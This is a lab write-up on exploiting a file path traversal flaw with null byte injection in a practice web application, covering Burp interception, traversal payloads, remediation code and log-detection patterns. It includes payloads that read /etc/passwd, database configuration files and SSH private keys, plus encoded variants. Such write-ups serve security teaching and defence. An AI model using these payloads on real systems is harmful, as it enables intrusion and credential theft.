# Path Traversal Vulnerability Lab Report

**Lab Title:** File Path Traversal Using Null Byte Injection  
**Date:** February 14, 2026  
**Objective:** Exploit a file path traversal vulnerability to retrieve a sensitive flag file using request manipulation and null byte injection

---

## Executive Summary

This lab demonstrates the exploitation of a file path traversal vulnerability combined with HTTP request method manipulation and null byte injection. By modifying a GET request to POST, intercepting the traffic, and crafting a malicious file path parameter, sensitive system files were successfully accessed.

**Result:** Successfully retrieved the flag from `/etc/flag3`

---

## Lab Objectives

- Intercept and manipulate HTTP requests using a proxy tool
- Modify HTTP request methods from GET to POST
- Exploit file path traversal vulnerabilities
- Use null byte injection to bypass file extension restrictions
- Retrieve sensitive files from the server filesystem

---

## Tools Required

- **Web Browser:** Chrome/Firefox with Developer Tools
- **Proxy Tool:** Burp Suite or similar intercepting proxy
- **Target:** Vulnerable web application with file upload/processing functionality

---

## Methodology

### Phase 1: Initial Setup and Request Capture

**Objective:** Configure the browser and proxy to intercept HTTP traffic

#### Step 1.1: Configure Browser Proxy Settings

1. Open browser proxy settings
2. Configure to route traffic through intercepting proxy (typically `127.0.0.1:8080`)
3. Enable proxy interception

#### Step 1.2: Navigate to Lab

1. Access the target lab URL
2. Ensure proxy is actively intercepting requests

**Result:** ✓ Browser successfully configured to route traffic through proxy

---

### Phase 2: Request Method Modification

**Objective:** Change the HTTP request method from GET to POST

#### Step 2.1: Inspect the Page

1. Right-click on the page → Select **"Inspect"** or press `F12`
2. Navigate to the **Network** tab in Developer Tools
3. Locate the relevant request in the network inspector

#### Step 2.2: Modify Request Method

1. In the browser's Developer Tools (Inspector)
2. Find the request method parameter
3. Change from **GET** to **POST**
4. Close the Inspector

**Technical Detail:**
```
Original: GET /upload HTTP/1.1
Modified: POST /upload HTTP/1.1
```

**Result:** ✓ Request method successfully changed to POST

---

### Phase 3: Request Interception and Analysis

**Objective:** Capture the POST request for manipulation

#### Step 3.1: Generate Test Request

1. In the file text block on the webpage, enter: `test`
2. Click the submit/upload button
3. The request is intercepted by the proxy tool

#### Step 3.2: Send to Repeater

1. In the proxy intercept view, locate the captured request
2. Right-click → **"Send to Repeater"** (or use `Ctrl+R` in Burp Suite)
3. Navigate to the **Repeater** tab

**Captured Request Example:**
```http
POST /upload HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

file=test&submit=Upload
```

**Result:** ✓ Request successfully captured and sent to Repeater for manipulation

---

### Phase 4: Path Traversal Exploitation

**Objective:** Craft a malicious file path to access `/etc/flag3`

#### Step 4.1: Understanding the Vulnerability

The application likely expects a filename but doesn't properly validate or sanitize the input, allowing directory traversal attacks.

**Attack Vector:** File parameter accepts user-controlled input

#### Step 4.2: Construct the Payload

**Payload:** `../../../../etc/flag3%00`

**Breakdown:**
- `../` - Directory traversal sequence (move up one directory)
- `../../../../` - Move up four directory levels to reach root
- `etc/flag3` - Target file path
- `%00` - Null byte (URL-encoded)

**Why This Works:**

1. **Directory Traversal (`../`):** Navigates up the directory tree to escape the intended file storage location
   
2. **Null Byte Injection (`%00`):** 
   - Terminates the string in certain programming languages (C, PHP < 5.3.4)
   - Bypasses file extension restrictions
   - Example: If the application appends `.txt`, the null byte truncates it
   - `flag3%00.txt` becomes `flag3` at the filesystem level

#### Step 4.3: Modify the Request

In the Repeater tab, modify the `file` parameter:

**Modified Request:**
```http
POST /upload HTTP/1.1
Host: vulnerable-lab.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

file=../../../../etc/flag3%00&submit=Upload
```

#### Step 4.4: Send the Request

1. Click **"Send"** in Burp Repeater
2. Observe the response in the right panel

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 156

<!DOCTYPE html>
<html>
<body>
<h2>File Contents:</h2>
<pre>
FLAG{th1s_1s_th3_s3cr3t_fl4g}
</pre>
</body>
</html>
```

**Result:** ✓ **Successfully retrieved the flag from `/etc/flag3`**

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ 1. User Access → Browser → Proxy (Intercept ON)            │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Inspect Page → Modify GET to POST → Close Inspector     │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Enter "test" → Submit → Request Captured by Proxy       │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Send to Repeater → Modify file parameter                │
│    file=../../../../etc/flag3%00                            │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. Send Request → Retrieve Flag ✓                          │
└─────────────────────────────────────────────────────────────┘
```

---

## Technical Analysis

### Vulnerability Chain

This attack exploited multiple security weaknesses:

#### 1. **Insufficient Input Validation**
- The application accepts user input for the `file` parameter without validation
- No whitelist of allowed characters or file paths
- No restriction on directory traversal sequences

#### 2. **Path Traversal (CWE-22)**
- The `../` sequences allow navigation outside the intended directory
- Application constructs file paths using unsanitized user input
- No canonicalization or normalization of file paths

#### 3. **Null Byte Injection (CWE-158)**
- The `%00` null byte terminates the string prematurely
- Bypasses file extension restrictions
- Particularly effective against legacy code or certain language implementations

### Directory Traversal Depth Analysis

```
Application Base: /var/www/uploads/
Payload: ../../../../etc/flag3

Path Resolution:
/var/www/uploads/../../../../etc/flag3
/var/www/uploads/../../../etc/flag3  (up 1: /var/www/)
/var/www/../../../etc/flag3           (up 2: /var/)
/var/../../etc/flag3                  (up 3: /)
/../etc/flag3                         (up 4: /)
/etc/flag3                            (final resolution)
```

---

## Security Implications

### Severity Assessment

**CVSS Score:** 9.1 (Critical)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Impact:** High (Confidentiality, Integrity, Availability)

### Potential Impact

1. **Arbitrary File Read:**
   - Access to `/etc/passwd` - User enumeration
   - Access to `/etc/shadow` - Password hashes (if permissions allow)
   - Access to application configuration files with database credentials
   - Access to source code files

2. **Information Disclosure:**
   - Sensitive business data
   - User personal information
   - API keys and secrets
   - System configuration details

3. **Privilege Escalation:**
   - Reading SSH private keys
   - Accessing authentication tokens
   - Retrieving session data

4. **Further Attack Vectors:**
   - Combined with Local File Inclusion (LFI) for code execution
   - Log poisoning attacks
   - Path traversal to overwrite files (if write permissions exist)

---

## Real-World Attack Scenarios

### Example 1: Reading Password File
```http
POST /upload HTTP/1.1

file=../../../../../../../etc/passwd%00
```

### Example 2: Accessing Application Config
```http
POST /upload HTTP/1.1

file=../../../../var/www/config/database.php%00
```

### Example 3: Reading SSH Keys
```http
POST /upload HTTP/1.1

file=../../../../home/admin/.ssh/id_rsa%00
```

---

## Remediation Recommendations

### Immediate Actions (Priority: CRITICAL)

#### 1. **Input Validation and Sanitization**

```python
# Vulnerable Code
filename = request.POST.get('file')
file_path = os.path.join(UPLOAD_DIR, filename)

# Secure Code
import os
import re

def sanitize_filename(filename):
    # Remove directory traversal sequences
    filename = re.sub(r'\.\./', '', filename)
    filename = re.sub(r'\.\.\\', '', filename)
    
    # Remove null bytes
    filename = filename.replace('\x00', '')
    
    # Allow only alphanumeric, dots, dashes, underscores
    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)
    
    return filename

filename = sanitize_filename(request.POST.get('file'))
file_path = os.path.join(UPLOAD_DIR, filename)

# Verify the final path is within the intended directory
if not os.path.abspath(file_path).startswith(os.path.abspath(UPLOAD_DIR)):
    raise SecurityException("Invalid file path")
```

#### 2. **Use Whitelisting**

```python
ALLOWED_FILES = ['report.pdf', 'invoice.doc', 'receipt.txt']

if filename not in ALLOWED_FILES:
    return "File not allowed"
```

#### 3. **Path Canonicalization**

```python
import os

def safe_join(directory, filename):
    # Resolve to absolute path
    abs_directory = os.path.abspath(directory)
    abs_path = os.path.abspath(os.path.join(directory, filename))
    
    # Ensure the path is within the intended directory
    if not abs_path.startswith(abs_directory):
        raise ValueError("Path traversal detected")
    
    return abs_path

try:
    safe_path = safe_join(UPLOAD_DIR, user_filename)
except ValueError:
    return "Invalid filename"
```

#### 4. **Disable Null Byte Processing**

- Update to modern language versions (PHP >= 5.3.4)
- Explicitly filter null bytes from input
- Use language-specific security functions

### Long-Term Solutions

1. **Implement a Security Framework:**
   - Use established frameworks with built-in protections
   - Django, Flask with security extensions
   - Enable security headers and CSP

2. **File Access Abstraction:**
   ```python
   # Use database IDs instead of filenames
   file_id = request.POST.get('file_id')
   file_record = Database.get_file_by_id(file_id)
   
   if file_record.owner != current_user:
       return "Access denied"
   
   return serve_file(file_record.internal_path)
   ```

3. **Principle of Least Privilege:**
   - Run web application with minimal file system permissions
   - Use chroot jails or containers
   - Implement SELinux or AppArmor policies

4. **Web Application Firewall (WAF):**
   - Deploy ModSecurity or similar WAF
   - Rules to detect `../` patterns
   - Block requests with null bytes

5. **Regular Security Audits:**
   - Automated vulnerability scanning
   - Manual penetration testing
   - Code review with security focus

6. **Security Headers:**
   ```http
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   Content-Security-Policy: default-src 'self'
   ```

---

## Detection and Monitoring

### Log Indicators

Monitor for suspicious patterns in application logs:

```bash
# Path traversal attempts
grep -i "\.\." /var/log/apache2/access.log
grep -i "%2e%2e" /var/log/apache2/access.log

# Null byte injection
grep -i "%00" /var/log/apache2/access.log
grep -i "\x00" /var/log/apache2/access.log

# Access to sensitive files
grep -i "/etc/passwd" /var/log/apache2/access.log
grep -i "/etc/shadow" /var/log/apache2/access.log
```

### SIEM Rules

Create alerts for:
- Multiple `../` sequences in parameters
- Null byte characters in requests
- Access attempts to `/etc/` paths
- Unusual file parameter values

---

## Lessons Learned

### Key Takeaways

1. **Defense in Depth:** Multiple security controls are necessary:
   - Input validation
   - Path canonicalization
   - Access control
   - Least privilege

2. **Never Trust User Input:** All user-supplied data must be validated and sanitized

3. **Legacy Vulnerabilities Persist:** Null byte injection still works on older systems

4. **Testing Methodology:**
   - Systematic approach to vulnerability discovery
   - Proxy tools are essential for web application testing
   - Request manipulation reveals hidden weaknesses

5. **HTTP Method Matters:** Some vulnerabilities only manifest with specific request methods

### Attack Progression

```
Simple Input → Path Traversal → Null Byte Injection → File Access
    ↓              ↓                    ↓                  ↓
  "test"    → "../../file"  → "../../file%00"  → "/etc/flag3"
```

---

## Conclusion

This lab successfully demonstrated a critical path traversal vulnerability exploited through:

1. **Request method modification** (GET → POST)
2. **Traffic interception** using proxy tools
3. **Path traversal sequences** (`../../../../`)
4. **Null byte injection** (`%00`) to bypass restrictions
5. **Successful retrieval** of the target file `/etc/flag3`

The vulnerability chain highlights the importance of comprehensive input validation, secure file handling practices, and defense-in-depth security strategies. Organizations must implement multiple layers of protection to prevent such fundamental yet devastating security flaws.

---

## Appendix A: Commands and Payloads

### Attack Progression

| Step | Action | Payload/Command | Result |
|------|--------|-----------------|--------|
| 1 | Configure proxy | Browser settings → Proxy: 127.0.0.1:8080 | ✓ Setup complete |
| 2 | Modify request method | Inspector: GET → POST | ✓ Method changed |
| 3 | Test submission | file=test | ✓ Request captured |
| 4 | Path traversal | file=../../../../etc/flag3%00 | ✓ Flag retrieved |

### Payload Variations

```
Basic path traversal:
../../../../etc/flag3

With null byte:
../../../../etc/flag3%00

URL encoded:
..%2F..%2F..%2F..%2Fetc%2Fflag3%00

Double URL encoded:
..%252F..%252F..%252F..%252Fetc%252Fflag3%2500
```

---

## Appendix B: Testing Checklist

- [ ] Configure browser proxy settings
- [ ] Enable request interception
- [ ] Navigate to target application
- [ ] Open browser Developer Tools
- [ ] Modify request method (GET → POST)
- [ ] Submit test data
- [ ] Capture request in proxy
- [ ] Send request to Repeater
- [ ] Modify file parameter with traversal payload
- [ ] Add null byte injection
- [ ] Send modified request
- [ ] Analyze response for flag
- [ ] Document findings
- [ ] Report vulnerability

---

## References

- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **CWE-158:** Improper Neutralization of Null Byte or NUL Character
- **OWASP Testing Guide:** Testing for Path Traversal
- **Burp Suite Documentation:** Using Repeater

---

**Lab Status:** ✓ COMPLETED  
**Flag Retrieved:** ✓ SUCCESS  
**Vulnerability Severity:** CRITICAL  
**Remediation Priority:** IMMEDIATE